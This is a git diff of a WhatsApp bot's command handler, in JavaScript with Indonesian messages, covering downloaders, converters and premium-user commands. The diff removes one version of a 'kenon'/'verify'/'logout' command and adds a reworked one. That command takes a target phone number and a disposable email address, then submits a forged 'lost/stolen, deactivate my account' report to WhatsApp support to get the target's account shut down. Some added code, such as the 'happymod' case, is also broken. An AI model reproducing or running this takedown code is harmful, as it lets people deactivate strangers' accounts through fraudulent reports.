@@ -11,7 +11,7 @@ const { dafontSearch, dafontDown } = require('./scrape/dafont')
 const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
 const { getRegisterNo, getRegisterName, getRegisterSerial, getRegisterAge, getRegisterTime, getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/user/signUp.js')
 const anon = require('./lib/menfess')
-const scp1 = require('./scrape/scraper') 
+const scp1 = require('./scrape/scraper')
 const scp2 = require('./scrape/scraperr')
 const scp3 = require('./scrape/scraperrr')
 const ffstalk = require('./scrape/ffstalk')
@@ -76,6 +76,7 @@ try {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await OctopusBotzz.decodeJid(OctopusBotzz.user.id)
+        //const ownNumber = await OctopusBotzz.decodeJid()
         const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const XeonTheDeveloper = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
@@ -459,56 +460,6 @@ function getRandom(ext) {
 
 const pickRandom = (arr) => {
 return arr[Math.floor(Math.random() * arr.length)]
-}
-
-const downloadMp4 = async (Link) => {
-let gHz = require("./scrape/savefrom")
-let Lehd = await gHz.savefrom(Link)
-let ghd = await reSize(Lehd.thumb, 300, 300)
-let ghed = await ytdl.getInfo(Link)
-let gdyr = await OctopusBotzz.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
-Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
-Title : ${Lehd.meta.title}
-Duration : ${Lehd.meta.duration}
-Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
-try {
-await ytdl.getInfo(Link)
-let mp4File = getRandom('.mp4')
-console.log(color('Download Video With ytdl-core'))
-let nana = ytdl(Link)
-.pipe(fs.createWriteStream(mp4File))
-.on('finish', async () => {
-await OctopusBotzz.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
-fs.unlinkSync(`./${mp4File}`)
-})
-} catch (err) {
-m.reply(`${err}`)
-}
-}
-
-const downloadMp3 = async (Link) => {
-let pNx = require("./scrape/savefrom")
-let Puxa = await pNx.savefrom(Link)
-let MlP = await reSize(Puxa.thumb, 300, 300)
-let PlXz = await ytdl.getInfo(Link)
-let gedeyeer = await OctopusBotzz.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
-Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
-Title : ${Puxa.meta.title}
-Duration : ${Puxa.meta.duration}
-Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
-try {
-await ytdl.getInfo(Link)
-let mp3File = getRandom('.mp3')
-console.log(color('Download Audio With ytdl-core'))
-ytdl(Link, { filter: 'audioonly' })
-.pipe(fs.createWriteStream(mp3File))
-.on('finish', async () => {
-await OctopusBotzz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
-fs.unlinkSync(mp3File)
-})
-} catch (err) {
-m.reply(`${err}`)
-}
 }
 
 async function sendPoll(jid, text, list) {
@@ -1115,60 +1066,14 @@ case 'test': case 'tes': {
 m.reply("Bot udh on nii")
 }
 break
-case 'verify': case 'banned': case 'kenon': case 'logout': case 'hai': {
-            	if (!isCreator) return replygc(mess.owner)
-if (m.quoted || q) {
-const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
-let cekno = await OctopusBotzz.onWhatsApp(froms)
-if (cekno.length == 0) return m.reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
-if (froms === ownerNumber) return m.reply(`Tidak bisa verif Creator Saya!`)
-let targetnya = froms.split('@')[0]
-try {
-let axioss = require('axios')
-let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = ntah.headers["set-cookie"].join("")
-const cheerio = require('cheerio');
-let $ = cheerio.load(ntah.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDONESIA")
-form.append("phone_number", `+${targetnya}`,)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Perdido/roubado: desative minha conta")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
+case 'shutdown': case 'offbot': case 'restart': {
 
-let res = await axioss({
-url,
-method: "POST",
-data: form,
-headers: {
-cookie
-}
+if (!isCreator) return replygc(mess.owner)
+reply(`Restart nih ya...`)
+reply('Tunggu 1.5s')
+await sleep(1500)
+process.exit()
 
-})
-let payload = String(res.data)
-if (payload.includes(`"payload":true`)) {
-OctopusBotzz.sendMessage(6281359391296 + "@s.whatsapp.net", { text: `*KENON WA BERHASIL!*` })
-} else if (payload.includes(`"payload":false`)) {
-OctopusBotzz.sendMessage(6281359391296 + "@s.whatsapp.net", { text: `*KENON WA GAGAL, COBA LAGI NANTI!*` })
-} else m.reply(util.format(res.data))
-} catch (err) {reply(`${err}`)}
-} else OctopusBotzz.sendMessage(6281359391296 + "@s.whatsapp.net", { text: `Masukkan Nomornya!` })
 }
 break
 /*
@@ -1310,12 +1215,12 @@ case 'tomp4': case 'tovideo': {
 break
 case 'spotify':{
 
-  if (!text) return replygc(`Where is the link?`)
+  if (!text) return replygc(`Linknya?`)
   m.reply(mess.wait)
   let Spotify = require('./lib/spotify')
   let spotify = new Spotify(text)
   let info = await spotify.getInfo()
-  if ((info).error) return replygc(`The link you provided is not spotify link`)
+  if ((info).error) return replygc(`Tautan yang Anda berikan bukan tautan spotify!`)
   let { name, artists, album_name, release_date, cover_url } = info
   let details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
             ','
@@ -1323,7 +1228,8 @@ case 'spotify':{
   let response = await OctopusBotzz.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
   let bufferpotify = await spotify.download()
   
-  await OctopusBotzz.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
+  await OctopusBotzz.sendMessage(m.chat, { audio: bufferpotify, mimetype: 'audio/mpeg', }, { quoted: response })
+  //await OctopusBotzz.sendMessage(m.chat, { audio: bufferpotify, mimetype: 'audio/mpeg', fileName: `${name || "}`}, { quoted : m })
         
 }
 break
@@ -1338,26 +1244,6 @@ caption:`ini pp mu`,
 {quoted:m})
 }
 break
-/*
-case 'tokenprem': {
-  
-  if (terpakai) reply(`nomor kamu sudah menukarkan token ini sebelumnya!`)
-  let tek = 5jx6k4uxReukcXrjysrukscKtduckk
-  if (text = tek){
-  
-  }
-
-if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 6281359391296`)
-prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
-let ceknya = await OctopusBotzz.onWhatsApp(prrkek)
-if (ceknya.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
-prem.push(prrkek)
-fs.writeFileSync('./database/premiums.json', JSON.stringify(prem))
-replygc(`Suksess menukarkan token premium!`)
-
-}
-break
-*/
 case 'daftar': case 'register': case 'regis': {
 
   if (isNoregis) return reply(lang.regis())
@@ -1445,7 +1331,7 @@ case 'say':
 
             if (!text) return replygc('Masukkan teksnya!')
             let textnya = text
-            const hasilAudio = googleTTS.getAudioUrl(textnya, {
+            const hasilAudio = await googleTTS.getAudioUrl(textnya, {
                lang: langx,
                slow: false,
                host: "https://translate.google.com",
@@ -1644,10 +1530,6 @@ case 'brainly': {
 
 }
 break
-case 'cek':
-let me = m.sender
-reply(`+${me.split('@')[0]}`)
-break
 case 'speedtest': {
 
 reply(mess.wait)
@@ -1748,7 +1630,7 @@ ppgroup = 'https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60'
 break
 case 'dtobin': {
 
-  if (!text) reply(`kode desimalnya mana kak?`)
+  /*
   // Contoh penggunaan
   const decimalValue = text;
   const binaryString = decimalToBinary(decimalValue);
@@ -1758,7 +1640,29 @@ case 'dtobin': {
     const binaryString = decimal.toString(2);
     return binaryString;
   }
-  reply(`Nilai biner dari ${decimalValue} adalah ${binaryString}`);
+  */
+  
+
+  if (!text) reply(`kode desimalnya mana kak?`)
+  function decimalToBinary(decimal) {
+  if (decimal === 0) {
+    return '0';
+  }
+
+  let binary = '';
+  while (decimal > 0) {
+    binary = (decimal % 2) + binary;
+    decimal = Math.floor(decimal / 2);
+  }
+
+  return binary;
+}
+
+  const decimalNumber = text; // Ganti dengan angka desimal yang ingin diubah
+  const binaryResult = decimalToBinary(decimalNumber);
+  reply(`Nilai biner dari ${decimalNumber} adalah ${binaryResult}`);
+//console.log(`Angka desimal ${decimalNumber} dalam bentuk biner adalah: ${binaryResult}`);
+
 
 }
 break
@@ -1786,6 +1690,46 @@ case 'btodec': {
 
 }
 break
+case 'dtohex': {
+
+function decimalToHex(decimal) {
+  return decimal.toString(16).toUpperCase();
+}
+
+function isValidDecimalInput(input) {
+  return /^\d+$/.test(input);
+}
+
+const decimalValue = text; // Ganti dengan nilai desimal yang ingin Anda konversi
+
+if (isValidDecimalInput(decimalValue)) {
+  const hexValue = decimalToHex(parseInt(decimalValue));
+  reply(`Nilai desimal ${decimalValue} setara dengan nilai heksadesimal ${hexValue}`);
+} else {
+  reply("Nilai desimal salah, mohon periksa kembali!");
+}
+
+}
+break
+case 'htodec': {
+
+function hexToDecimal(hex) {
+  return parseInt(hex, 16);
+}
+function isHexadecimal(hex) {
+  const hexRegex = /^[0-9A-Fa-f]+$/;
+  return hexRegex.test(hex);
+}
+const hexValue = text; // Ganti dengan nilai heksadesimal yang ingin Anda konversi
+if (isHexadecimal(hexValue)) {
+  const decimalValue = hexToDecimal(hexValue);
+  reply(`Nilai heksadesimal ${hexValue} setara dengan nilai desimal ${decimalValue}`);
+} else {
+  reply("Nilai heksadesimal salah, mohon periksa kembali!");
+}
+
+}
+break
 case 'jadwaltkj': case 'jtkj':
   
   OctopusBotzz.sendMessage(m.chat, { image: { url : 'https://telegra.ph/file/37bc1fcd702101fa99f70.jpg' }, caption: 
@@ -1794,11 +1738,103 @@ case 'jadwaltkj': case 'jtkj':
 break
 case 'yuerel': {
   if (!text) reply(`masukkan link!`)
-  OctopusBotzz.sendMessage(m.chat, { image: { url : text }, caption: 
-`Jadwal X TKJ II` }, { quoted: m } )
+  OctopusBotzz.sendMessage(m.chat, { image: { url : `${text}` }, caption: 
+`Url downloader by Octopus Bot` }, { quoted: m } )
 }
 break
+case 'verify':
+case 'kenon':
+case 'logout': {
 
+if (!isCreator) return reply('🤨 Mau Ngapain Lu?\nFitur ini khusus Owner anjay')
+
+const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
+let targetnya = froms.split('@')[0]
+if (!isCreator) return newReply('🤨 Mau Ngapain Lu?')
+
+if (targetnya === global.ownernumber) {
+reply(`wow, kisanak ini ingin saya gebug sampai bunyi deg karena mau kenon nomor owner saya🗿`)
+} else if (m.quoted || q) {
+let cekno = await OctopusBotzz.onWhatsApp(froms)
+if (cekno.length == 0) return reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
+try {
+let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let cookie = ntah.headers["set-cookie"].join("; ")
+const cheerio = require('cheerio');
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "INDONESIA")
+form.append("phone_number", `+${targetnya}`,)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", "Perdido/roubado: desative minha conta")
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1006630858")
+form.append("__comment_req", "0")
+
+replygc(`*INFO:*\n\nMenjalankan kenon...\nTarget: ${targetnya}`)
+let res = await axios({
+url,
+method: "POST",
+data: form,
+headers: {
+cookie
+}
+})
+let payload = String(res.data)
+if (payload.includes(`"payload":true`)) {
+reply(`*INFO:*\n\nSucces kenon!\nNo ${targetnya} Telah logout`)
+} else if (payload.includes(`"payload":false`)) {
+reply(`Hai ${pushname} Saat Ini Belum Dapat Melogout kan Mohon Untuk Menunggu Beberapa Saat`)
+} else reply(util.format(res.data))
+} catch (err) {
+  reply(`${err}`)
+}
+} else reply('Masukkan nomor target!')
+}
+break
+case 'cek': {
+const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
+let targetnya = froms.split('@')[0]
+if (!isCreator) return newReply('🤨 Mau Ngapain Lu?')
+if (targetnya === global.ownernumber) {
+reply("itu nomer owner gw njg")
+} else {
+reply(targetnya)
+reply("aman tod")
+}
+}
+break
+case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
+	        //const qmsg = (quoted.msg || quoted)
+	        let replay = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
+	        if (!/image/.test(mime)) return replay
+            if (!text) return replay
+	        m.reply(mess.wait)
+            atas = text.split('|')[0] ? text.split('|')[0] : '-'
+            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
+	        //let dwnld = await OctopusBotzz.downloadAndSaveMediaMessage(qmsg)
+	        let dwnld = await OctopusBotzz.downloadAndSaveMediaMessage(mime)
+	        let { TelegraPh } = require('./lib/toUrl')
+	        let mediaX = await TelegraPh(dwnld)
+	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mediaX}`
+	        let sticNya = await OctopusBotzz.sendImageAsSticker(m.chat, smeme, fdoc, { packname: global.packname, author: global.auhor })
+	        await fs.unlinkSync(sticNya)
+}
+break
 
                                // Ori Feature //
 case 'public': {
@@ -1840,16 +1876,6 @@ try {
 OctopusBotzz.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
 } catch (err) {
 replygc(`Belum ada pengguna yang menyewa menjadi bot`)
-}
-break
-case 'shutdown': case 'offbot': case 'restart': {
-
-if (!isCreator) return replygc(mess.owner)
-reply(`Restart nih ya...`)
-reply('Tunggu 1.5s')
-await sleep(1500)
-process.exit()
-
 }
 break
 case 'owner':
@@ -3296,7 +3322,9 @@ if (!m.isGroup) return replygc(mess.group)
 if (!isAdmins && !isCreator) return replygc(mess.admin)
 if (!isBotAdmins) return replygc(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await OctopusBotzz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replygc(jsonformat(res))).catch((err) => replygc(jsonformat(err)))
+await OctopusBotzz.groupParticipantsUpdate(m.chat, [users], 'promote')
+reply("Sukses!")
+//.then((res) => replygc(jsonformat(res))).catch((err) => replygc(jsonformat(err)))
 }
 break
 case 'demote': {
@@ -3304,7 +3332,9 @@ if (!m.isGroup) return replygc(mess.group)
 if (!isAdmins && !isCreator) return replygc(mess.admin)
 if (!isBotAdmins) return replygc(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await OctopusBotzz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replygc(jsonformat(res))).catch((err) => replygc(jsonformat(err)))
+await OctopusBotzz.groupParticipantsUpdate(m.chat, [users], 'demote')
+reply("Sukses!")
+//.then((res) => replygc(jsonformat(res))).catch((err) => replygc(jsonformat(err)))
 }
 break
 case 'hidetag': {
@@ -3355,8 +3385,8 @@ case 'tiktok': {
   if (!text) return reply(`Example : ${prefix + command} link`)
   if (!q.includes('tiktok')) return replygc(`Link Invalid!!`)
   replygc(mess.wait)
-  const { Tiktok } = require('./lib/downloader')
-  const hasil = await Tiktok(text)
+  const { tiktokDl } = require("./lib/downloader")
+  const hasil = await tiktokDl(text)
   OctopusBotzz.sendMessage(m.chat, { caption: `Here you go!`, video: { url: hasil.nowm }}, {quoted:m})
 }
 break
@@ -3364,15 +3394,15 @@ case 'tiktokaudio':{
 if (!text) return replygc( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return replygc(`Link Invalid!!`)
 replygc(mess.wait)
-const { Tiktok } = require('./lib/downloader')
-const hasil = await Tiktok(text)
+const { tiktokDl } = require("./lib/downloader")
+const hasil = await tiktokDl(text)
 OctopusBotzz.sendMessage(m.chat, { audio: { url: hasil.audio }, mimetype: 'audio/mp4' }, { quoted: m })
 }
 break
 case 'mediafire': {
 	if (args.length == 0) return replygc(`Where is the link ?`)
 	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygc(`The link you provided is invalid`)
-	const { mediafireDl } = require('./lib/mediafire')
+	const { mediafireDl } = require("./lib/downloader")
 	const baby1 = await mediafireDl(text)
 	if (baby1[0].size.split('MB')[0] >= 100) return replygc('Oops, the file is too big...')
 	const result4 = `*MEDIAFIRE DOWNLOADER*
@@ -3403,8 +3433,23 @@ break
 case 'happymod':{
 if (!q) return replygc(`Example ${prefix+command} Sufway surfer mod`)
 replygc(mess.wait)
-let kat = await scp1.happymod(q)
-replygc(util.format(kat))
+
+let google = require('google-it')
+google({'query': text}).then(res => {
+let teks = `Google Search From : ${text}\n\n`
+for (let g of res) {
+teks += `⭔ *Title* : ${g.title}\n`
+teks += `⭔ *Description* : ${g.snippet}\n`
+teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
+} 
+replygc(teks)
+})
+
+let haMod = require('./scrape/scraper') 
+let haMod = await scp1.happymod(q)
+haMod({'': text}).then
+
+replygc(util.format(haMod))
 }
 break
 case 'recipe':{
@@ -3452,9 +3497,9 @@ replygc(mess.wait)
 let search = await yts(text)
 url = search.videos[0].url
 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
-eek = await getBuffer(anu.thumbnail)
+thumb = await getBuffer(anu.thumbnail)
 owned = `${ownernumber}@s.whatsapp.net`
-ngen = `
+tekes = `
 Title : ${anu.title}
 Ext : Search
 ID : ${anu.videoId}
@@ -3465,107 +3510,115 @@ Channel : ${anu.author.url}
 Link : ${anu.url}
 
 Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
-OctopusBotzz.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
+OctopusBotzz.sendMessage(m.chat, { image : thumb, caption: tekes }, { quoted: m})
 }
 break
 case 'play':  case 'song': case 'ytmp3': {
 if (!text) return replygc(`Example : ${prefix + command} anime whatsapp status`)
-const xeonplaymp3 = require('./lib/ytdl2')
-const { fetchBuffer } = require("./lib/myfunc2")
+replygc (mess.wait)
+
+let yetedl = require('./lib/ytdl2')
 let yts = require("youtube-yts")
-        let search = await yts(text)
-        let anup3k = search.videos[0]
-const pl= await xeonplaymp3.mp3(anup3k.url)
-await OctopusBotzz.sendMessage(m.chat,{
-    audio: fs.readFileSync(pl.path),
-    fileName: anup3k.title + '.mp3',
+let { fetchBuffer } = require("./lib/myfunc2")
+// Ekspresi Reguler untuk mendeteksi link YouTube
+let youtubeRegex = /(?:https?:\/\/)?(?:www\.)?youtu(?:be\.com|\.be)\/(?:watch\?v=|embed\/|v\/)?([^\s&?\/]+)/i;
+
+// Cek apakah input mengandung link YouTube menggunakan test() pada ekspresi reguler
+if (youtubeRegex.test(text)) {
+  console.log("yt terdeteksi");
+  hasilmp3 = await yetedl.mp3(text)
+} else {
+  console.log("Tidak ada link YouTube");
+  search = await yts(text)
+  searchValue = search.videos[0]
+  hasilmp3 = await yetedl.mp3(searchValue.url)
+}
+const empeTri = await OctopusBotzz.sendMessage(m.chat,{
+    audio: fs.readFileSync(hasilmp3.path),
+    fileName: searchValue.title + '.mp3',
     mimetype: 'audio/mp4', ptt: true,
     contextInfo:{
         externalAdReply:{
-            title:anup3k.title,
+            title:searchValue.title,
             body: botname,
-            thumbnail: await fetchBuffer(pl.meta.image),
+            thumbnail: await fetchBuffer(hasilmp3.meta.image),
             mediaType:2,
-            mediaUrl:anup3k.url,
+            mediaUrl:searchValue.url,
         }
 
     },
 },{quoted:m})
-await fs.unlinkSync(pl.path)
+fs.unlinkSync(hasilmp3.path)
 }
 break
 case 'ytmp4': case 'ytvideo': {
-const xeonvidoh = require('./lib/ytdl2')
-if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygc(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
-const vid=await xeonvidoh.mp4(text)
-const ytc=`
+if (!text) replygc(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
+if (!args[0].includes('youtube.com')) {
+return reply(`Terjadi kesalahan!\nMohon cek kembali & sertakan link youtube yang valid!`)
+} else {
+const downVid = require('./lib/ytdl2')
+const vid = await downVid.mp4(text)
+const capt = `
 *${themeemoji}Tittle:* ${vid.title}
 *${themeemoji}Date:* ${vid.date}
 *${themeemoji}Duration:* ${vid.duration}
 *${themeemoji}Quality:* ${vid.quality}`
 await OctopusBotzz.sendMessage(m.chat,{
     video: {url:vid.videoUrl},
-    caption: ytc
+    caption: capt
 },{quoted:m})
 }
-break
-case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
-if (!text) return replygc('Enter the link!!!')
-replygc(mess.wait)
-downloadMp4(text)
 }
 break
-case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
-if (!text) return replygc('Enter the link!!!')
-replygc(mess.wait)
-downloadMp3(text)
-}
-break  
-case 'getcase':
+case 'getcase': case 'takecase':
 if (!text) return m.reply(`masukkan query!\ncontoh: ${command} menu`)
 if (!isCreator) return replygc(mess.owner)
 const getCase = (cases) => {
-return "case"+`'${cases}'`+fs.readFileSync("octopus.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
+return "case"+`'${cases}'`+fs.readFileSync("OctopusBotzz.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
 }
 replygc(`${getCase(q)}`)
 break
 case 'addprem':
 if (!isCreator) return replygc(mess.owner)
-if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 6281359391296`)
-prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
-let ceknya = await OctopusBotzz.onWhatsApp(prrkek)
-if (ceknya.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
-prem.push(prrkek)
+if (!args[0]) return replygc(`Gunakan ${prefix+command} nomor\nContoh ${prefix+command} 6281359391296`)
+noCek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
+let ceknya = await OctopusBotzz.onWhatsApp(noCek)
+if (ceknya.length == 0) return replygc(`Masukkan nomor yang valid dan terdaftar di WhatsApp!`)
+prem.push(noCek)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
-replygc(`The Number ${prrkek} Has Been Premium!`)
+replygc(`Sukses!, nomor ${noCek} telah menjadi Premium!`)
 break
 case 'delprem':
+nom = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+let cekNum = await OctopusBotzz.onWhatsApp(nom)
 if (!isCreator) return reply(mess.owner)
 if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6281359391296`)
-if (command == ownernumber) reply(`Nomor pemilik tidak bisa dihapus dari premium!`)
-ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
+if (cekNum.length == 0) return reply(`Peserta tersebut tidak terdaftar di WhatsApp`)
+if (command == global.ownernumber) reply(`Nomor pemilik tidak bisa dihapus dari premium!`)
+
+nuom = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
-replygc(`The Number ${ya} Has Been Removed Premium!`)
+replygc(`Nomor ${nuom} Telah Dihapus Premium!`)
 break
 case 'addbadword':{
 if (!isCreator) return reply(mess.owner)
-if (args.length < 1) return reply('Whats the word?')
+if (args.length < 1) return reply('Apa kata-nya?')
 if (BadXeon.includes(q)) return replygc("The word is already in use")
 BadXeon.push(q)
 fs.writeFileSync('./database/toxic/bad.json', JSON.stringify(BadXeon))
-replygc(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
+replygc(`Sukses Menambahkan Kata Buruk\nPeriksa dengan mengetikkan ${prefix}listbadword`)
 }
 break
 case 'delbadword':{
 if (!isCreator) return reply(mess.owner)
-if (args.length < 1) return reply('Enter the word')
-if (!BadXeon.includes(q)) return replygc("The word does not exist in the database")
+if (args.length < 1) return reply('Inputkan kata-kata pendeteksian buruknya!')
+if (!BadXeon.includes(q)) return reply('Kata itu tidak ada di database')
 let wanu = BadXeon.indexOf(q)
 BadXeon.splice(wanu, 1)
 fs.writeFileSync('./database/toxic/bad.json', JSON.stringify(BadXeon))
-replygc(`Success deleting bad word ${q}`)
+replygc(`Berhasil menghapus kata-kata buruk ${q}`)
 }
 break
 case 'listbadword':{
@@ -3573,7 +3626,7 @@ let teks = '┌──⭓「 *BadWord List* 」\n│\n'
 for (let x of BadXeon) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${BadXeon.length}*`
+teks += `│\n└────────────⭓\n\n*Total yang ada : ${BadXeon.length}*`
 replygc(teks)
 }
 break
@@ -3794,17 +3847,18 @@ break
             OctopusBotzz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
             }
             break
-            case 'tomp3': {
-            if (/document/.test(mime)) return replygc(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-            if (!/video/.test(mime) && !/audio/.test(mime)) return replygc(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-            if (!quoted) return replygc(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-            replygc(mess.wait)
-            let media = await quoted.download()
-            let { toAudio } = require('./lib/converter')
-            let audio = await toAudio(media, 'mp4')
-            OctopusBotzz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${OctopusBotzz.user.name}.mp3`}, { quoted : m })
-            }
-            break
+case 'tomp3': {
+  if (/document/.test(mime)) return replygc(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
+  if (!/video/.test(mime) && !/audio/.test(mime)) return replygc(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
+  if (!quoted) return replygc(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
+  replygc(mess.wait)
+  let media = await quoted.download()
+  let { toAudio } = require('./lib/converter')
+  let audio = await toAudio(media, 'mp4')
+            
+  OctopusBotzz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${OctopusBotzz.user.name}.mp3`}, { quoted : m })
+}
+break
             case 'tovn': case 'toptt': {
             if (!/video/.test(mime) && !/audio/.test(mime)) return replygc(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
             if (!quoted) return replygc(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
@@ -5395,7 +5449,7 @@ OctopusBotzz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 } catch (err) {
 console.log(util.format(err))
 //let e = String(err)
-OctopusBotzz.sendMessage("6281359391296@s.whatsapp.net", { text: `*Hello developer, there seems to be an error, please fix it*\n\n${util.format(err)}`, 
+OctopusBotzz.sendMessage("6281359391296@s.whatsapp.net", { text: `*Ada yang error nih...\nError:*\n\n${util.format(err)}`, 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
